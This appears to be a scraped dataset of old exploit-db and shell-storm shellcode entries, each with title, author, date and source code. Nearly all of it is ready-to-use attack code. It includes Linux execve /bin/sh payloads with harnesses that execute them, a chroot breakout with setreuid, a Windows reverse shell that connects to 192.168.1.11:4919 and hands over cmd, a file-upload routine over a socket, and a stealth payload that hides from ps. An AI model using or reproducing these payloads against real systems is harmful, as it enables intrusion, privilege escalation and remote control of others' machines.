"\"\\x31\\xc0\\x88\\x46\\x0b\\x56\\x51\\xb0\\x05\\x66\\xb9\\x41\\x02\\x66\\xba\\xff\"", "\"\\x01\\xcd\\x80\\x89\\xc7\\x5e\\x89\\xf3\\xb0\\x03\\x8d\\x8c\\x24\\x38\\xff\\xff\"", "\"\\xff\\xb2\\x01\\xcd\\x80\\x83\\xf8\\xff\\x74\\x3e\\x31\\xc9\\x39\\xc1\\x74\\x13\"", "\"\\x8d\\x8c\\x24\\x38\\xff\\xff\\xff\\x31\\xdb\\x89\\xfb\\x89\\xc2\\xb0\\x04\\xcd\"", "\"\\x80\\xeb\\xd3\\xb0\\x06\\x89\\xf3\\xcd\\x80\\xb0\\x06\\x31\\xdb\\x89\\xfb\\xcd\"", "\"\\x80\\x31\\xf6\\x5e\\x89\\x76\\x0c\\x31\\xc0\\x89\\x46\\x10\\xb0\\x0b\\x87\\xf3\"", "\"\\x8d\\x4b\\x0c\\x8d\\x53\\x10\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\\xe8\\x8b\\xff\"", "\"\\xff\\xff\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x63\\x74\";", "", "[4]", "", "int", "upload ( char* ip )", "{", "\tint s;", "\tint fd;", "\tchar ch;", "\tstruct stat st;", "", "\ts = conn ( ip );", "", "\tif ( ( fd = open ( \"file\", O_RDONLY ) ) == -1 )", "\t\treturn ( 1 );", "\tfstat ( fd, &st );", "\twhile ( st.st_size-- > 0 )", "\t{", "\t\tif ( read ( fd, &ch, 1 ) < 0 )", "\t\t\treturn ( 1 );", "\t\tif ( write ( s, &ch, 1 ) < 0 )", "\t\t\treturn ( 1 );", "\t}", "\tclose ( fd );", "\tclose ( s );", "\treturn ( 0 );", "}", "", "# milw0rm.com [2005-06-19]"]},
{"Title": "Linux/x86 - Break chroot (../ 20x Loop) + execve(/bin/sh) Shellcode (66 bytes)", "Author": "Okti", "Published": ": 2005-07-11", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13415.c", "View": "https://old.exploit-db.com/raw/13415/", "code": ["/*", " Linux/x86 chroot and standart shellcode.", " By Okti (http://okti.nm.ru)", "", " ----------------------------------------------------------------------------------------------", "*/", "", " /* Mkdir and Chroot are written in C: */", "", " #include<stdio.h>", " #include<unistd.h>", " #include<sys/types.h>", " #include<sys/stat.h>", " int main(void) {", "", "        mkdir(\"sh\", 0);", "        chown(\"sh\", 0, 0);", "        chmod(\"sh\", S_IRUSR | S_IWUSR);", "        chroot(\"sh\");", "\t/* But many '../' as possible, i'm to lazy to add comments ;) */", "        chroot(\"../../../../../../../../../../../../../../../../../../../../../../../../\");", " }", "", " ----------------------------------------------------------------------------------------------", "", " Asm version of the above C code:", "", " ----------------------------------------------------------------------------------------------", "", " \t.file\t\"y.c\"", "\t.section\t.rodata", ".LC0:", "\t.string\t\"sh\"", "\t.align 4", ".LC1:", "\t.string\t\"../../../../../../../../../../../../../../../../../../../../\"", "\t.text", ".globl main", "\t.type\tmain, @function", "main:", "\tpushl\t%ebp", "\tmovl\t%esp, %ebp", "\tsubl\t$8, %esp", "\tandl\t$-16, %esp", "\tmovl\t$0, %eax", "\taddl\t$15, %eax", "\taddl\t$15, %eax", "\tshrl\t$4, %eax", "\tsall\t$4, %eax", "\tsubl\t%eax, %esp", "\tsubl\t$8, %esp", "\tpushl\t$0", "\tpushl\t$.LC0", "\tcall\tmkdir", "\taddl\t$16, %esp", "\tsubl\t$4, %esp", "\tpushl\t$0", "\tpushl\t$0", "\tpushl\t$.LC0", "\tcall\tchown", "\taddl\t$16, %esp", "\tsubl\t$8, %esp", "\tpushl\t$384", "\tpushl\t$.LC0", "\tcall\tchmod", "\taddl\t$16, %esp", "\tsubl\t$12, %esp", "\tpushl\t$.LC0", "\tcall\tchroot", "\taddl\t$16, %esp", "\tsubl\t$12, %esp", "\tpushl\t$.LC1", "\tcall\tchroot", "\taddl\t$16, %esp", "\tleave", "\tret", "\t.size\tmain, .-main", "\t.section\t.note.GNU-stack,\"\",@progbits", "\t.ident\t\"GCC: (GNU) 3.4.1 (Mandrakelinux 10.1 3.4.1-4mdk)\"", "", " ------------------------------------------------------------------------------------------------", "", " Standart setreuid and execve shellcode (66 bytes).", " It is all clean and tidy, uses 'pop' and 'push', to get string '/bin/sh' from data segment,", " no null bytes.", " For details, compile this asm code with: nasm -f elf shell.asm then ld shell.o and ./a.out", "", " ------------------------------------------------------------------------------------------------", "", "  section .data", "", "  db '/bin/sh'", "  global _start", "", "  _start:", "", " ; setruid(uid_t ruid, uid_t euid)", "", "  xor eax, eax", "  mov al, 70", "  xor ebx, ebx", "  xor ecx, ecx", "  int 0x80", "", " jmp two", " one:", "  pop ebx", "", " ; execve(const char *filename, char *const argv[], char *const envp[])", "", "  xor eax, eax", "  mov [ebx+7], al", "  mov [ebx+8], ebx", "  mov [ebx+12], eax", "  mov al, 11", "  lea ecx, [ebx+8]", "  lea edx, [ebx+12]", "  int 0x80", "", "  two:", "  call one", "  db '/bin/sh'", "", " ---------------------------------------------------------------------------------------------------", "", " Hex opcodes of the mkdir chroot and above shellcode asm instructions (in C).", "", " ---------------------------------------------------------------------------------------------------", "", " #include<stdio.h>", " #include<stdlib.h>", " int main() {", "", "        int *ret;", "        long offset = 4;", "        char star[] =", "        \"\\x89\\xda\\x8b\\x4c\\x24\\x08\\x8b\\x5c\\x24\\x04\\xb8\\x27\\x00\\x00\\x00\\xcd\\x80\"", "        \"\\x89\\xda\\x8b\\x5c\\x24\\x04\\xb8\\x3d\\x00\\x00\\x00\\xcd\\x80\"", "        \"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\"", "        \"\\x80\\xe9\\x16\\x00\\x00\\x00\\x5b\\x31\\xc0\\x88\\x43\\x07\\x89\\x58\\x08\\x89\"", "        \"\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd\\x80\\xe8\\xe5\\xff\\xff\"", "        \"\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\";", "", "        *((int * ) &ret + offset) = (int) star;", " }", "", "", "// milw0rm.com [2005-07-11]"]},
{"Title": "Windows (9x/NT/2000/XP) - PEB Method Shellcode (29 bytes)", "Author": "loco", "Published": ": 2005-07-26", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-388.php", "View": null, "code": ["//", "// PEB way of getting kernel32 imagebase by loco.", "// Compatible with all Win9x/NT based operating systems.", "//", "// Gives kernel32 imagebase in eax when executing.", "// 29 bytes, only eax/esi used.", "//", "// Originally discovered by Dino Dai Zovi.", "//", "//", "", "#include <stdio.h>", "", "/*", "\txor   eax, eax", "\tadd   eax, fs:[eax+30h]", "\tjs    method_9x", "", "method_nt:", "\tmov   eax, [eax + 0ch]", "\tmov   esi, [eax + 1ch]", "\tlodsd", "\tmov   eax, [eax + 08h]", "\tjmp   kernel32_ptr_found", "", "method_9x:", "\tmov   eax, [eax + 34h]", "\tlea   eax, [eax + 7ch]", "\tmov   eax, [eax + 3ch]", "kernel32_ptr_found:", "*/", "", "unsigned char Shellcode[] =", "\t\"\\x33\\xC0\"          // xor eax, eax", "\t\"\\x64\\x03\\x40\\x30\"  // add eax, dword ptr fs:[eax+30]", "\t\"\\x78\\x0C\"          // js short $+12", "\t\"\\x8B\\x40\\x0C\"      // mov eax, dword ptr [eax+0C]", "\t\"\\x8B\\x70\\x1C\"      // mov esi, dword ptr [eax+1C]", "\t\"\\xAD\"              // lodsd", "\t\"\\x8B\\x40\\x08\"      // mov eax, dword ptr [eax+08]", "\t\"\\xEB\\x09\"          // jmp short $+9", "\t\"\\x8B\\x40\\x34\"      // mov eax, dword ptr [eax+34]", "\t\"\\x8D\\x40\\x7C\"      // lea eax, dword ptr [eax+7C]", "\t\"\\x8B\\x40\\x3C\"      // mov eax, dword ptr [eax+3C]", "; // = 29 bytes.", "", "int main()", "{", "\tprintf(\"Shellcode is %u bytes.\\n\\n\", sizeof(Shellcode)-1);", "\treturn 1;", "}", "", "// milw0rm.com [2005-07-26]"]},
{"Title": "Windows (9x/NT/2000/XP) - Reverse Generic Without Loader (192.168.1.11:4919) Shellcode (249 bytes)", "Author": "Matthieu Suiche", "Published": ": 2005-08-16", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-389.php", "View": null, "code": ["We use the PEB for the Output/Input/Error Handles.", "", "typedef struct PEB", "BOOLEAN InheritedAddressSpace ;", "BOOLEAN ReadImageFileExecOptions ;", "BOOLEAN BeingDebugged ;", "BOOLEAN Spare ;", "HANDLE Mutant ;", "PVOID ImageBaseAddress ;", "PPEB LDR DATA LoaderData ;", "PRTL USER PROCESS PARAMETERS ProcessParameters ;", "...", "typedef struct RTL USER PROCESS PARAMETERS", "ULONG MaximumLength ;", "ULONG Length ;", "ULONG Flags ;", "ULONG DebugFlags ;", "PVOID ConsoleHandle ;", "ULONG ConsoleFlags ;", "HANDLE StdInputHandle ; +18h", "HANDLE StdOutputHandle ; +1Ch", "HANDLE StdErrorHandle ; +20h", "...", "", "So with the nooil tricks we have now :", "mov eax,dword ptr fs :[18h]", "mov eax,dword ptr ds :[eax+30h]", "mov eax,dword ptr ds :[eax+10h]", "mov ecx, hClientSocket", "mov dword ptr ds :[eax+18h],ecx ; SetStdHandle(STD INPUT HANDLE,hClientSocket) ;", "mov dword ptr ds :[eax+1Ch],ecx ; SetStdHandle(STD OUTPUT HANDLE,hClientSocket) ;", "mov dword ptr ds :[eax+20h],ecx ; SetStdHandle(STD ERROR HANDLE,hClientSocket) ;", "", "249 bytes Reverse Generic Shellcode without loader(no null byte) :", "", "comment *", "-----------------------------------------------------------------", "---- New generation shellcode using my \"nooil tricks\" methods ---", "----    (c) 2005 - Matthieu Suiche / msuiche@gmail.com        ---", "249 bytes Reverse Generic Shellcode without loader(no null byte)", "-----------------------------------------------------------------", "hehe hi metasploit's guys ;)", "*", ".386", ".model flat, stdcall", "", "assume fs:nothing", "", "LoadLibraryA    equ 0D6C3D898h", "WSAStartupA     equ 0C7B3B4CBh", "WSASocketA      equ 0B8ACB6C6h", "connect                 equ 06EE2D2C8h", "system                  equ 0E873E6D8h", "ExitProcessA    equ 0D7D8EA95h", "; ------------------------------", "sin_addr                equ 0B01A8C0h ; 192.168.1.11", "sin_port                equ 3713h       ; 4919", "; ------------------------------", "str_cmd                 equ 0FF646D63h", "", "; ----------------------------------------------------", "_nooil_ segment public ; writable section", ";.", "; ----- CODE -----", "scode:", "       jmp short _eip", "       GetEip:", "       pop             edi", "       jmp short EntryPoint", "_eip:", "       call    GetEip", "Kernel32BaseAddr:", "       pushad", "       test    eax, eax", "       jnz             MyGetProcAddr", "       ; eax = 0", "       mov     eax, dword ptr fs:[eax+30h]", "       mov     eax, dword ptr ds:[eax+0ch]", "       mov     esi, dword ptr ds:[eax+1ch]", "       lodsd", "       mov     eax, dword ptr ds:[eax+08h]", "MyGetProcAddr:", "       mov             edx, eax", "", "; - PE", "       add             edx, dword ptr ds:[edx+3ch]", "", "; - Export Table", "       mov             edx, dword ptr ds:[edx+78h]", "       add             edx, eax", "", "       mov     ebx, dword ptr ds:[edx+20h]", "       add             ebx, eax", "", "       xor             ecx, ecx", "       mov             ebp, eax", "", "FindAddr:", "       inc             ecx", "       mov     edi, dword ptr ds:[ebx+ecx*4]", "       add             edi, eax", "", "       mov             esi, dword ptr [edi]", "       add             esi, dword ptr [edi+4]", "       cmp             esi, [esp+36]", "       jz              AddrFound", "       jmp             short FindAddr", "", "AddrFound:", "", "       mov     ebx, dword ptr ds:[edx+24h]", "       add     ebx, ebp", "       mov     cx,word ptr ds:[ebx+ecx*2]", "", "       mov     ebx, dword ptr ds:[edx+1Ch]", "       add     ebx, ebp", "       add     ebp, dword ptr ds:[ebx+ecx*4]", "", "       mov             dword ptr [esp+28], ebp", "       popad", "       retn", "", "EntryPoint:", "       xor             eax, eax", "       xor             ecx, ecx", "       push    LoadLibraryA", "       call    edi                                                     ; MyGetProcAddr(LoadLibraryA);", "       mov             ebp, eax", "", "       push    cx", "       push    word ptr '23'", "       push    '_2sw'", "       push    esp", "       call    eax             ; LoadLibraryA(\"ws2_32\");", "", "       mov             ebx, eax", "", "       push    WSAStartupA", "       call    edi             ; MyGetProcAddr(WSAStartupA)", "", "", "       mov             esi, esp", "       add             si, -301h", "       push    esi", "       push    2", "       call    eax             ; WSAStartup(2,&WSAstruct);", "", "       mov             eax, ebx", "", "       push    WSASocketA", "       call    edi             ; MyGetProcAddr(WSASocketA);", "", "       xor             esi, esi", "       push    esi", "       push    esi", "       push    esi", "       push    esi", "       inc             esi", "       push    esi", "       inc             esi", "       push    esi", "       call    eax             ; WSASocket(2,1,0,0,0,0);", "", "       xchg    ebx, eax ; ebx = sockfd , eax = ws2_32", "", "       push    sin_addr", "       push    word ptr sin_port", "       push    si", "       mov             esi, esp", "", "       push    connect", "       call    edi             ; MyGetProcAddr(connect)", "", "       push    10h", "       push    esi", "       push    ebx", "       call    eax             ; connect(sockfd, &struct, sizeof(struct));", "", "       push    ax", "       push    word ptr 'tr'", "       push    'cvsm'", "       push    esp", "       call    ebp             ; LoadLibraryA(\"msvcrt\");", "", "       push    system", "       call    edi             ; MyGetProcAddr(system);", "", "       ; ----------------------------- nooil tricks ----------------------------------", "       xor             ecx, ecx", "       mov             ecx,dword ptr fs:[ecx+18h]", "       mov             ecx,dword ptr ds:[ecx+30h]", "       mov             ecx,dword ptr ds:[ecx+10h]", "       mov             dword ptr ds:[ecx+18h],ebx ; SetStdHandle(STD_INPUT_HANDLE,hClient);", "       mov     dword ptr ds:[ecx+1Ch],ebx ; SetStdHandle(STD_OUTPUT_HANDLE,hClient);", "       mov     dword ptr ds:[ecx+20h],ebx ; SetStdHandle(STD_ERROR_HANDLE,hClient);", "       ; -----------------------------------------------------------------------------", "", "", "       push    str_cmd", "       inc             byte ptr [esp+3]", "       push    esp", "       call    eax     ; system(\"cmd\");", "", "       ; Exit", "       push    ExitProcessA", "       call    edi             ; MyGetProcAddr(ExitProcessA)", "       call    eax             ; ExitProcessA();", "end scode", "; ------ END CODE ------", ";.", "_nooil_ ends", "; ----------------------------------------------------", "", "; milw0rm.com [2005-08-16]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + sysenter Opcode Array Payload Shellcode (45 bytes)", "Author": "c0ntex", "Published": ": 2005-08-19", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13414.c", "View": "https://old.exploit-db.com/raw/13414/", "code": ["/*", " lnx_binsh2.c - v1 - 45 Byte /bin/sh sysenter Opcode Array Payload", " Copyright(c) 2005 c0ntex <c0ntex@open-security.org>", "", " This program is free software; you can redistribute it and/or modify", " it under the terms of the GNU General Public License as published by", " the Free Software Foundation; either version 2 of the License, or", " (at your option) any later version.", "", " This program is distributed in the hope that it will be useful,", " but WITHOUT ANY WARRANTY; without even the implied warranty of", " MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", " GNU General Public License for more details.", "", " You should have received a copy of the GNU General Public License", " along with this program; if not, write to the Free Software", " Foundation, Inc., 59 Temple Place, Suite 330, Boston,", " MA  02111-1307  USA", "", "*/", "", "/*", "", "Tested: fedora core 3", "", "execve(\"/bin/sh\") using sysenter from __kernel_vsyscall appose to int $0x80", "", "(gdb) disas __kernel_vsyscall", "Dump of assembler code for function __kernel_vsyscall:", "0xffffe400 <__kernel_vsyscall+0>:       push   %ecx", "0xffffe401 <__kernel_vsyscall+1>:       push   %edx", "0xffffe402 <__kernel_vsyscall+2>:       push   %ebp", "0xffffe403 <__kernel_vsyscall+3>:       mov    %esp,%ebp", "0xffffe405 <__kernel_vsyscall+5>:       sysenter", "0xffffe407 <__kernel_vsyscall+7>:       nop", "0xffffe408 <__kernel_vsyscall+8>:       nop", "0xffffe409 <__kernel_vsyscall+9>:       nop", "0xffffe40a <__kernel_vsyscall+10>:      nop", "0xffffe40b <__kernel_vsyscall+11>:      nop", "0xffffe40c <__kernel_vsyscall+12>:      nop", "0xffffe40d <__kernel_vsyscall+13>:      nop", "0xffffe40e <__kernel_vsyscall+14>:      jmp    0xffffe403 <__kernel_vsyscall+3>", "0xffffe410 <__kernel_vsyscall+16>:      pop    %ebp", "0xffffe411 <__kernel_vsyscall+17>:      pop    %edx", "0xffffe412 <__kernel_vsyscall+18>:      pop    %ecx", "0xffffe413 <__kernel_vsyscall+19>:      ret", "0xffffe414 <__kernel_vsyscall+20>:      add    %al,(%eax)", "0xffffe416 <__kernel_vsyscall+22>:      add    %al,(%eax)", "0xffffe418 <__kernel_vsyscall+24>:      add    %al,(%eax)", "0xffffe41a <__kernel_vsyscall+26>:      add    %al,(%eax)", "0xffffe41c <__kernel_vsyscall+28>:      add    %al,(%eax)", "0xffffe41e <__kernel_vsyscall+30>:      add    %al,(%eax)", "End of assembler dump.", "(gdb) q", "", "so we replace", "", "int $0x80", "", "instruction with", "", "push   %ecx", "push   %edx", "push   %ebp", "mov    %esp,%ebp", "sysenter", "", "which does make the shellcode slightly larger  :/", "", "", " 804807a:       51                      push   %ecx", " 804807b:       52                      push   %edx", " 804807c:       55                      push   %ebp", " 804807d:       89 e5                   mov    %esp,%ebp", " 804807f:       0f 34                   sysenter", "", "*/", "", "/*", " Calling: execve(/bin/sh), exit(0)", "*/", "", "", "#include <stdio.h>", "", "typedef char wikkid;", "", "wikkid oPc0d3z[] = \"\\x31\\xc0\\x31\\xdb\\x50\\x68\\x2f\\x2f\"", "                   \"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"", "                   \"\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\"", "                   \"\\x0b\\x51\\x52\\x55\\x89\\xe5\\x0f\\x34\"", "                   \"\\x31\\xc0\\x31\\xdb\\xfe\\xc0\\x51\\x52\"", "                   \"\\x55\\x89\\xe5\\x0f\\x34\";", "", "unsigned long grab_esp()", "{", "\t\t__asm__(\"movl %esp,%eax\");", "}", "", "int main(void)", "{", "\tunsigned long delta;", "\tvoid (*pointer)();", "", "\tdelta = grab_esp();", "", "\tfprintf(stderr, \"\\n[-] Stack Pointer found -> [0x%x]\\n\", delta);", "\tfprintf(stderr, \"\\t[-] Size of payload egg -> [%d]\\n\", sizeof(oPc0d3z)-1);", "", "\tpointer=(void*)&oPc0d3z;", "", "\twhile(pointer) {", "\t\tfprintf(stderr, \"\\t[-] Payload Begin -> [0x%x]\\n\", pointer);", "\t\tfprintf(stderr, \"\\t[-] Payload End   -> [0x%x]\\n\\n\", pointer+45);", "\t\tpointer();", "\t}", "", "\t_exit(0);", "}", "", "// milw0rm.com [2005-08-19]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + sysenter Opcode Array Payload Shellcode (27 bytes)", "Author": "amnesia", "Published": ": 2005-08-25", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13413.c", "View": "https://old.exploit-db.com/raw/13413/", "code": ["/*", " lnx_binsh3.c - v1 - 27 Byte /bin/sh sysenter Opcode Array Payload", " Copyright(c) 2005 c0ntex <c0ntex@open-security.org>", " Copyright(c) 2005 amnesia <amnesia@anomalistic.org>", "", " This program is free software; you can redistribute it and/or modify", " it under the terms of the GNU General Public License as published by", " the Free Software Foundation; either version 2 of the License, or", " (at your option) any later version.", "", " This program is distributed in the hope that it will be useful,", " but WITHOUT ANY WARRANTY; without even the implied warranty of", " MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", " GNU General Public License for more details.", "", " You should have received a copy of the GNU General Public License", " along with this program; if not, write to the Free Software", " Foundation, Inc., 59 Temple Place, Suite 330, Boston,", " MA  02111-1307  USA", "", "*/", "", "/*", "", "Tested: fedora core 3 - c0ntex", "        debian SID - amnesia", "", "execve(\"/bin/sh\") using sysenter from __kernel_vsyscall appose to int $0x80", "", "(gdb) disas __kernel_vsyscall", "Dump of assembler code for function __kernel_vsyscall:", "0xffffe400 <__kernel_vsyscall+0>:       push   %ecx", "0xffffe401 <__kernel_vsyscall+1>:       push   %edx", "0xffffe402 <__kernel_vsyscall+2>:       push   %ebp", "0xffffe403 <__kernel_vsyscall+3>:       mov    %esp,%ebp", "0xffffe405 <__kernel_vsyscall+5>:       sysenter", "0xffffe407 <__kernel_vsyscall+7>:       nop", "0xffffe408 <__kernel_vsyscall+8>:       nop", "0xffffe409 <__kernel_vsyscall+9>:       nop", "0xffffe40a <__kernel_vsyscall+10>:      nop", "0xffffe40b <__kernel_vsyscall+11>:      nop", "0xffffe40c <__kernel_vsyscall+12>:      nop", "0xffffe40d <__kernel_vsyscall+13>:      nop", "0xffffe40e <__kernel_vsyscall+14>:      jmp    0xffffe403 <__kernel_vsyscall+3>", "0xffffe410 <__kernel_vsyscall+16>:      pop    %ebp", "0xffffe411 <__kernel_vsyscall+17>:      pop    %edx", "0xffffe412 <__kernel_vsyscall+18>:      pop    %ecx", "0xffffe413 <__kernel_vsyscall+19>:      ret", "0xffffe414 <__kernel_vsyscall+20>:      add    %al,(%eax)", "0xffffe416 <__kernel_vsyscall+22>:      add    %al,(%eax)", "0xffffe418 <__kernel_vsyscall+24>:      add    %al,(%eax)", "0xffffe41a <__kernel_vsyscall+26>:      add    %al,(%eax)", "0xffffe41c <__kernel_vsyscall+28>:      add    %al,(%eax)", "0xffffe41e <__kernel_vsyscall+30>:      add    %al,(%eax)", "End of assembler dump.", "(gdb) q", "", "so we replace", "", "int $0x80", "", "instruction with", "", "push   %ecx", "push   %edx", "push   %ebp", "mov    %esp,%ebp", "sysenter", "", "which does make the shellcode slightly larger  :/", "", "", " 804807a:       51                      push   %ecx", " 804807b:       52                      push   %edx", " 804807c:       55                      push   %ebp", " 804807d:       89 e5                   mov    %esp,%ebp", " 804807f:       0f 34                   sysenter", "", " $ ./lnx_binsh3", "", " [-] Stack Pointer found -> [0xbffff648]", "         [-] Size of payload egg -> [27]", "\t [-] Payload Begin -> [0x804968c]", "\t [-] Payload End   -> [0x80496b9]", "", " sh-2.05b$", "", "*/", "", "/*", " Calling: execve(/bin/sh), exit(0)", "*/", "", "", "#include <stdio.h>", "", "typedef char wikkid;", "", "/* reduced shellcode size from 45 to 27 - amnesia */", "wikkid oPc0d3z[] = \"\\x31\\xc0\\x31\\xdb\\x50\\x68\\x2f\\x2f\"", "                   \"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"", "                   \"\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\"", "                   \"\\x0b\\x0f\\x34\";", "", "unsigned long grab_esp()", "{", "\t\t__asm__(\"movl %esp,%eax\");", "}", "", "int main(void)", "{", "\tunsigned long delta;", "\tvoid (*pointer)();", "", "\tdelta = grab_esp();", "", "\tfprintf(stderr, \"\\n[-] Stack Pointer found -> [0x%x]\\n\", delta);", "\tfprintf(stderr, \"\\t[-] Size of payload egg -> [%d]\\n\", sizeof(oPc0d3z)-1);", "", "\tpointer=(void*)&oPc0d3z;", "", "\twhile(pointer) {", "\t\tfprintf(stderr, \"\\t[-] Payload Begin -> [0x%x]\\n\", pointer);", "\t\tfprintf(stderr, \"\\t[-] Payload End   -> [0x%x]\\n\\n\", pointer+27);", "\t\tpointer();", "\t}", "", "\t_exit(0);", "}", "", "// milw0rm.com [2005-08-25]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + sysenter Opcode Array Payload Shellcode (23 bytes)", "Author": "BaCkSpAcE", "Published": ": 2005-09-04", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-236.php", "View": null, "code": ["/*", " lnx_binsh4.c - v1 - 23 Byte /bin/sh sysenter Opcode Array Payload", " Copyright(c) 2005 c0ntex <c0ntex@open-security.org>", " Copyright(c) 2005 BaCkSpAcE <sinisa86@gmail.com>", "", " This program is free software; you can redistribute it and/or modify", " it under the terms of the GNU General Public License as published by", " the Free Software Foundation; either version 2 of the License, or", " (at your option) any later version.", "", " This program is distributed in the hope that it will be useful,", " but WITHOUT ANY WARRANTY; without even the implied warranty of", " MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the", " GNU General Public License for more details.", "", " You should have received a copy of the GNU General Public License", " along with this program; if not, write to the Free Software", " Foundation, Inc., 59 Temple Place, Suite 330, Boston,", " MA  02111-1307  USA", "", "*/", "", "/*", "", "Tested: fedora core 3 - c0ntex", "\tfedora core 4 - BaCkSpAcE", "        debian SID - amnesia", "", "execve(\"/bin/sh\") using sysenter from __kernel_vsyscall appose to int $0x80", "", "(gdb) disas __kernel_vsyscall", "Dump of assembler code for function __kernel_vsyscall:", "0xffffe400 <__kernel_vsyscall+0>:       push   %ecx", "0xffffe401 <__kernel_vsyscall+1>:       push   %edx", "0xffffe402 <__kernel_vsyscall+2>:       push   %ebp", "0xffffe403 <__kernel_vsyscall+3>:       mov    %esp,%ebp", "0xffffe405 <__kernel_vsyscall+5>:       sysenter", "0xffffe407 <__kernel_vsyscall+7>:       nop", "0xffffe408 <__kernel_vsyscall+8>:       nop", "0xffffe409 <__kernel_vsyscall+9>:       nop", "0xffffe40a <__kernel_vsyscall+10>:      nop", "0xffffe40b <__kernel_vsyscall+11>:      nop", "0xffffe40c <__kernel_vsyscall+12>:      nop", "0xffffe40d <__kernel_vsyscall+13>:      nop", "0xffffe40e <__kernel_vsyscall+14>:      jmp    0xffffe403 <__kernel_vsyscall+3>", "0xffffe410 <__kernel_vsyscall+16>:      pop    %ebp", "0xffffe411 <__kernel_vsyscall+17>:      pop    %edx", "0xffffe412 <__kernel_vsyscall+18>:      pop    %ecx", "0xffffe413 <__kernel_vsyscall+19>:      ret", "0xffffe414 <__kernel_vsyscall+20>:      add    %al,(%eax)", "0xffffe416 <__kernel_vsyscall+22>:      add    %al,(%eax)", "0xffffe418 <__kernel_vsyscall+24>:      add    %al,(%eax)", "0xffffe41a <__kernel_vsyscall+26>:      add    %al,(%eax)", "0xffffe41c <__kernel_vsyscall+28>:      add    %al,(%eax)", "0xffffe41e <__kernel_vsyscall+30>:      add    %al,(%eax)", "End of assembler dump.", "(gdb) q", "", "so we replace", "", "int $0x80", "", "instruction with", "", "push   %ecx", "push   %edx", "push   %ebp", "mov    %esp,%ebp", "sysenter", "", "which does make the shellcode slightly larger  :/", "", "", " 804807a:       51                      push   %ecx", " 804807b:       52                      push   %edx", " 804807c:       55                      push   %ebp", " 804807d:       89 e5                   mov    %esp,%ebp", " 804807f:       0f 34                   sysenter", "", " $ ./lnx_binsh4", "", " [-] Stack Pointer found -> [0xbfe0f0d8]", "         [-] Size of payload egg -> [23]", "\t [-] Payload Begin -> [0x80496c0]", "\t [-] Payload End   -> [0x80496d7]", "", " sh-3.00b$", "", "*/", "", "/*", " Calling: execve(/bin/sh), exit(0)", "*/", "", "", "#include <stdio.h>", "", "typedef char wikkid;", "", "/* reduced shellcode size from 45 to 23 - BaCkSpAcE */", "wikkid oPc0d3z[] = \"\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\"", "                   \"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x54\"", "                   \"\\x5b\\x52\\x53\\x54\\x59\\x0f\\x34\";", "", "unsigned long grab_esp()", "{", "\t\t__asm__(\"movl %esp,%eax\");", "}", "", "int main(void)", "{", "\tunsigned long delta;", "\tvoid (*pointer)();", "", "\tdelta = grab_esp();", "", "\tfprintf(stderr, \"\\n[-] Stack Pointer found -> [0x%x]\\n\", delta);", "\tfprintf(stderr, \"\\t[-] Size of payload egg -> [%d]\\n\", sizeof(oPc0d3z)-1);", "", "\tpointer=(void*)&oPc0d3z;", "", "\twhile(pointer) {", "\t\tfprintf(stderr, \"\\t[-] Payload Begin -> [0x%x]\\n\", pointer);", "\t\tfprintf(stderr, \"\\t[-] Payload End   -> [0x%x]\\n\\n\", pointer+23);", "\t\tpointer();", "\t}", "", "\t_exit(0);", "}", "", "// milw0rm.com [2005-09-04]"]},
{"Title": "Linux/x86 - Hide-Wait-Change (Hide from PS + Wait for /tmp/foo + chmod 0455) Shellcode (187+ bytes) (1)", "Author": "xort", "Published": ": 2005-09-08", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-244.php", "View": null, "code": ["/*----------------------------------------------------------------------------*", " *          [Mystique Project: Examples of long-term payloads]                *", " *                       hide-wait-change code                                *", " *                 by xort@tty64.org  &  izik@tty64.org                       *", " *----------------------------------------------------------------------------*", " * This code, upon execution, will perform the following things...            *", " *                                                                            *", " *   1) Fork a new process, and kill PPID via _exit() so we get inherrited    *", " *      by init and now have a new PID.                                       *", " *   2) Will obtain the current location of argv[0] by retrieving information *", " *      from /proc/self/stat.                                                 *", " *   3) Copy the name we wish to masquarade as into argv[0] in memory.        *", " *   4) Call setsid() to establish ourselfs as a process leader.              *", " *   5) Will sleep via nanosleep() for a givin interval of time.              *", " *   6) Will check to see if a file exist via access().                       *", " *   7) If it does not Loop back to step 5                                    *", " *   8) If it does then we chmod() the file with permissions 0455.            *", " *   9) Calls _exit()                                                         *", " *                                                                            *", " *  * steps 3-4 effectivly hide us from most ps-listings                      *", " *                                                                            *", " *   size: 187 + strlen(new-proc-name) + strlen(file-to-change)               *", " *----------------------------------------------------------------------------*/", "\t", "char shellcode[]=", "\"\\x6a\\x02\\x58\\xcd\\x80\\x85\\xc0\\x74\\x79\\x31\\xc0\\x40\\xcd\\x80\\x5b\\x8d\"", "\"\\x73\\x10\\xfe\\x43\\x0f\\x99\\x31\\xc9\\xb0\\x05\\xcd\\x80\\x93\\x6a\\x03\\x58\"", 